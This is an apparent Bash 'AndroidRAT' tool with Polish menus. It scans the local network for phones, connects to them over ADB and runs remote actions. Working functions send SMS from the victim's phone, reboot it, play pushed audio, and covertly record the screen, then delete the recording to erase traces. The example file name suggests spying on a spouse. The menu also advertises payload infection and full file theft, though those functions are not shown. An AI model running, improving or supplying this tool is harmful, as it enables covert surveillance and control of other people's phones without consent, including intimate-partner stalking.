#!/bin/bash


IP_brama="$(ip route | grep via | awk '{print$3}')"
Moje_IP="$(ifconfig | grep 192 | awk '{print$2}')"
UE="$(adb devices | grep 1 | awk {'print$1'})"


przygotuj_srodowisko()
{
        sudo apt-get install android-tools-adb
        sudo apt install ffmpeg libsdl2-2.0-0 adb wget \
                 gcc git pkg-config meson ninja-build libsdl2-dev \
                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \
                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev
        git clone https://github.com/Genymobile/scrcpy
        cd scrcpy
        ./install_release.sh
        cd ..       
        sudo apt-get install scrcpy 
        adb tcpip 5555
        clear
        sudo ./start.sh
}



pokaz_dostepne_cele()
{
        echo -e "\e[35m Dostepne cele w Twojej sieci to: \e[0m"
        sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'
        sudo ./start.sh
}

polacz_z_celem()
{
        sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'
        echo "podaj IP celu"
        read cel
        sudo adb connect $cel:5555
        sudo ./start.sh
}

podlaczone_cele()
{
        sudo adb devices
        sudo ./start.sh
}

reboot_celu()
{
        sudo adb reboot 
        clear
        sudo ./start.sh
}

wyslij_SMS()
{
        clear
        echo " Podaj nr tel np. +48000000000"
        read phone
        echo " Podaj tresc wiadomosci "
        read message
        adb shell service call isms 7 i32 0 s16 "com.android.mms.service" s16 "$phone" s16 "null" s16 "'$message'" s16 "null" s16 "null"
        sudo ./start.sh
}

nagraj_ekran()
{
        echo " Podaj nazwe pliku koncowego nagrania. np. dowod_zdrady_meza.mp4 "
        read file_name
        echo " Podaj czas nagrania. Max 180 sekund "
        read time 
        adb shell screenrecord /sdcard/$file_name.mp4 --time-limit $time
        echo "Trwa pobieranie pliku..."
        adb pull /sdcard/$file_name.mp4
        echo "Trwa kasowanie pliku na urzadzeniu..."
        adb shell rm /sdcard/$file_name.mp4
        sudo chmod 777 $file_name.mp4
        sudo ./start.sh
}

rozlacz_devices()
{
        adb disconnect
        sudo ./start.sh
}

zaladuj_i_uruchom_dzwiek()
{
        echo " Podaj sciezke do zaladowania pliku wav. ex /home/kali/Desktop/kot.wav"
        read sciezka
        echo "Podaj nazwe pliku ex. kot.wav"
        read nazwa_pliku 
        adb push $sciezka /sdcard
        adb shell am start -a android.intent.action.VIEW -d file:///sdcard/$nazwa_pliku -t video/wav
        adb shell rm sdcard/$nazwa_pliku
        sudo ./start.sh

}



figlet AndroidRAT

echo "|---------------------------------|"
echo "|       Owner: CiagnikWTF         |"
echo "|---------------------------------|"

echo "|---------------------------------|"
echo "|        WERSJA: FREE             |"
echo "|---------------------------------|"

echo " "
echo "PODLACZONO DO: " 
adb devices | awk '{print$1}'


echo -e " [] \e[31m Wyczysc Ekran - ENTER \e[0m"
echo -e " [0]  \e[31m Rozlacz urzadzenia \e[0m"
echo -e " [1]  \e[31m Przygotuj Odpowiednie Pliki Do Poprawnego Dzialania \e[0m"
echo -e " [2]  \e[31m Pokaz dostepne cele w sieci \e[0m"
echo -e " [3]  \e[31m Pokaz podlaczone cele \e[0m"
echo -e " [4]  \e[31m Polacz z celem \e[0m"
echo -e " [5]  \e[31m Zrestartuj Cel \e[0m"
echo -e " [6]  \e[31m Wygeneruj ladunek do zainfekowania celu- \e[32mPREMIUM\e[0m"
echo -e " [7]  \e[31m Wgraj ladunek do celu- \e[32mPREMIUM\e[0m"
echo -e " [8]  \e[31m Uruchom ladunek w telefonie i przejmij kontrole- \e[32mPREMIUM\e[0m"
echo -e " [9]  \e[31m Pobierz wszystkie pliki z telefonu- \e[32mPREMIUM\e[0m"
echo -e " [10]  \e[31m Wyslij wiadomosc SMS \e[0m"
echo -e " [11]  \e[31m Nagrywanie erkanu smartfona i zacieranie sladow \e[0m"
echo -e " [12]  \e[31m Otworz strone www na urzadzeniu- \e[32mPREMIUM\e[0m "
echo -e " [13]  \e[31m Zaladuj plik muzyczny i odtworz w smartfonie \e[0m "
echo -e " [14]  \e[31m Zdalne sterowanie Smartfonem - \e[32mPREMIUM\e[0m "
echo -e " [15]  \e[31m Zdalnie zadzwon na numer telefonu - \e[32mPREMIUM\e[0m "




read opcja
case "$opcja" in

  "0") rozlacz_devices ;; 
  "1") przygotuj_srodowisko ;;
  "2") pokaz_dostepne_cele ;;
  "3") podlaczone_cele ;;
  "4") polacz_z_celem ;;
  "5") reboot_celu ;;
  "6") generuj_ladunek ;;
  "7") zaladuj_ladunek_do_celu ;;
  "8") uruchom_ladunek ;;
  "9") sciagnij_zdjecia ;;
  "10") wyslij_SMS ;;
  "11") nagraj_ekran ;;
  "12") otworz_strone ;;  
  "13") zaladuj_i_uruchom_dzwiek ;;
  "14") zdalne_sterowanie ;;
  "15") zadzwon_na_tel ;;

  



  *) clear && ./start.sh
  
esac